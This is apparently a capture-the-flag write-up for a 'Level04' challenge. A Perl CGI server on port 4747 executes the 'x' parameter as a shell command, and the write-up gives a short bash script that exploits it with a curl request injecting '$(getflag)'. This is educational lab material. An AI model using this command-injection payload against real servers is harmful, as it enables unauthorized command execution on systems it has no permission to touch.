# Level04 Exploit

In this challenge, we have a Perl script named `level04.pl` that acts as a web server listening on port `4747`. This script utilizes the CGI module to handle requests and execute commands passed as a parameter named "x".

## Vulnerability Analysis

By examining the Perl script, we identify that it takes input from the "x" parameter and passes it to the `x` function, which subsequently executes the input as a command. This presents a significant security vulnerability, allowing us to execute arbitrary commands on the server.

## Exploit Procedure

To exploit this vulnerability and retrieve the flag, we can craft a request to the server with the desired command as the "x" parameter. Here's how we can accomplish this using `curl`:

```bash
# Send a request to the server with the command "getflag"
flag=$(curl 'http://'"$1:$2"'/?x=$(getflag)')

# Extract the flag from the response
flag=$(echo $flag | awk '{print $NF}')

# Print the flag to the terminal
echo "Password:"
echo $flag
```

This script sends a GET request to the server, specifying the command `$(getflag)` as the value for the "x" parameter. It then extracts the flag from the response and prints it to the terminal.

Ensure to replace `$1` and `$2` with the appropriate server IP address and port number respectively before executing the script.